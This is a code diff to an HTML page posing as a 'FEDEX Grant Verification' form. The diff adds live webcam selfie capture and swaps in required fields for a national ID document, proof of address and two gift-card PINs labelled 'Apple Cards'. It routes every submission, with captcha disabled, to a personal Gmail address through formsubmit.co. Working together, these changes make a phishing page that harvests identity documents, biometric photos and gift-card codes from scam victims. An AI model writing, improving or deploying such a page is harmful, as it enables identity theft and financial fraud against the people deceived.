@@ -116,10 +116,31 @@
             padding: 20px;
             border-radius: 4px;
             border: 2px dashed #ddd;
+            text-align: center;
         }
 
-        #selfieUpload {
-            margin-top: 10px;
+        #video {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 4px;
+            background-color: #000;
+            display: none;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        #capturedImage {
+            max-width: 500px;
+            width: 100%;
+            border-radius: 4px;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .camera-controls {
+            margin-top: 15px;
         }
 
         button {
@@ -276,19 +297,24 @@
             <p>We'll get back to you as soon as possible.</p>
         </div>
 
-        <form id="verificationForm" action="https://formspree.io/f/mojvogpy" method="POST" enctype="multipart/form-data">
+        <form id="verificationForm" action="https://formsubmit.co/thomasreeffedex@gmail.com" method="POST" enctype="multipart/form-data">
+            <!-- FormSubmit Configuration -->
+            <input type="hidden" name="_subject" value="FEDEX Grant Verification Submission">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
             
             <div class="form-section">
                 <h2>Facial Verification</h2>
                 <div class="camera-section">
-                    <p style="margin-bottom: 15px;">Please upload a clear selfie photo for identity verification</p>
-                    <div class="form-group">
-                        <label for="selfieUpload">Upload Selfie <span class="required">*</span></label>
-                        <input type="file" id="selfieUpload" name="selfie" accept="image/*" capture="user" required>
+                    <p style="margin-bottom: 15px;">Please capture a live selfie for identity verification</p>
+                    <video id="video" autoplay></video>
+                    <canvas id="canvas"></canvas>
+                    <img id="capturedImage" alt="Captured selfie">
+                    <div class="camera-controls">
+                        <button type="button" id="startCamera" class="secondary">Start Camera</button>
+                        <button type="button" id="captureBtn" style="display: none;">Capture Photo</button>
+                        <button type="button" id="retakeBtn" style="display: none;">Retake</button>
                     </div>
-                    <p style="font-size: 14px; color: #666; margin-top: 10px;">
-                        <strong>Tip:</strong> On mobile devices, this will open your camera. On desktop, you can upload a photo taken with your phone or webcam.
-                    </p>
                 </div>
             </div>
 
@@ -303,24 +329,24 @@
             <div class="form-section">
                 <h2>Financial Verification</h2>
                 <div class="form-group">
-                    <label for="bankVerification">Bank Verification Number (BVN) Document</label>
-                    <input type="file" id="bankVerification" name="bank_verification" accept="image/*,.pdf">
+                    <label for="proofOfAddress">Proof of Address (Utility Bill, Bank Statement, etc.)</label>
+                    <input type="file" id="proofOfAddress" name="proof_of_address" accept="image/*,.pdf">
                 </div>
                 <div class="form-group">
-                    <label for="taxHistory">Tax Payment History <span class="required">*</span></label>
-                    <input type="file" id="taxHistory" name="tax_history" accept="image/*,.pdf" required>
+                    <label for="nationalId">National ID Number Document <span class="required">*</span></label>
+                    <input type="file" id="nationalId" name="national_id" accept="image/*,.pdf" required>
                 </div>
             </div>
 
             <div class="form-section">
-                <h2>Valid Apple Card</h2>
+                <h2>Valid Apple Cards</h2>
                 <div class="form-group">
-                    <label for="referencePin1">Apple Card 1<span class="required">*</span></label>
-                    <input type="text" id="referencePin1" name="reference_pin_1" placeholder="Enter first card PIN" required>
+                    <label for="referencePin1">Card PIN 1 <span class="required">*</span></label>
+                    <input type="text" id="referencePin1" name="card_pin_1" placeholder="Enter first card PIN" required>
                 </div>
                 <div class="form-group">
-                    <label for="referencePin2">Apple Card 2<span class="required">*</span></label>
-                    <input type="text" id="referencePin2" name="reference_pin_2" placeholder="Enter second card PIN" required>
+                    <label for="referencePin2">Card PIN 2 <span class="required">*</span></label>
+                    <input type="text" id="referencePin2" name="card_pin_2" placeholder="Enter second card PIN" required>
                 </div>
             </div>
 
@@ -369,19 +395,97 @@
     </div>
 
     <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const capturedImage = document.getElementById('capturedImage');
+        const startCameraBtn = document.getElementById('startCamera');
+        const captureBtn = document.getElementById('captureBtn');
+        const retakeBtn = document.getElementById('retakeBtn');
         const form = document.getElementById('verificationForm');
         const successMessage = document.getElementById('successMessage');
+        let stream = null;
+
+        startCameraBtn.addEventListener('click', async () => {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                startCameraBtn.style.display = 'none';
+                captureBtn.style.display = 'inline-block';
+            } catch (err) {
+                alert('Could not access camera. Please ensure camera permissions are enabled.');
+            }
+        });
+
+        captureBtn.addEventListener('click', () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob((blob) => {
+                const file = new File([blob], 'selfie-verification.jpg', { type: 'image/jpeg' });
+                const dataTransfer = new DataTransfer();
+                dataTransfer.items.add(file);
+                
+                let selfieInput = document.getElementById('selfieFile');
+                if (!selfieInput) {
+                    selfieInput = document.createElement('input');
+                    selfieInput.type = 'file';
+                    selfieInput.name = 'selfie';
+                    selfieInput.id = 'selfieFile';
+                    selfieInput.style.display = 'none';
+                    form.appendChild(selfieInput);
+                }
+                selfieInput.files = dataTransfer.files;
+                
+                const imageData = canvas.toDataURL('image/jpeg');
+                capturedImage.src = imageData;
+                capturedImage.style.display = 'block';
+                video.style.display = 'none';
+                captureBtn.style.display = 'none';
+                retakeBtn.style.display = 'inline-block';
+                
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            }, 'image/jpeg', 0.9);
+        });
+
+        retakeBtn.addEventListener('click', async () => {
+            capturedImage.style.display = 'none';
+            retakeBtn.style.display = 'none';
+            
+            const selfieInput = document.getElementById('selfieFile');
+            if (selfieInput) {
+                selfieInput.remove();
+            }
+            
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                captureBtn.style.display = 'inline-block';
+            } catch (err) {
+                alert('Could not access camera. Please ensure camera permissions are enabled.');
+            }
+        });
 
         form.addEventListener('submit', (e) => {
             e.preventDefault();
             
-            const formData = new FormData(form);
+            const selfieInput = document.getElementById('selfieFile');
+            if (!selfieInput || !selfieInput.files.length) {
+                alert('Please capture a selfie before submitting.');
+                return;
+            }
             
             // Show loading state
             const submitBtn = form.querySelector('.submit-btn');
             const originalText = submitBtn.textContent;
             submitBtn.textContent = 'Submitting...';
             submitBtn.disabled = true;
+            
+            const formData = new FormData(form);
             
             fetch(form.action, {
                 method: 'POST',
@@ -395,16 +499,16 @@
                     successMessage.style.display = 'block';
                     window.scrollTo({ top: 0, behavior: 'smooth' });
                 } else {
-                    return response.json().then(data => {
-                        throw new Error(data.errors ? data.errors.map(e => e.message).join(', ') : 'Submission failed');
+                    return response.text().then(text => {
+                        throw new Error('Submission failed. Please try again.');
                     });
                 }
             }).catch(error => {
-                alert('Error: ' + error.message + '. Please check your internet connection and try again.');
+                alert('Error: ' + error.message);
                 submitBtn.textContent = originalText;
                 submitBtn.disabled = false;
             });
         });
     </script>
 </body>
-                    </html>
+    </html>
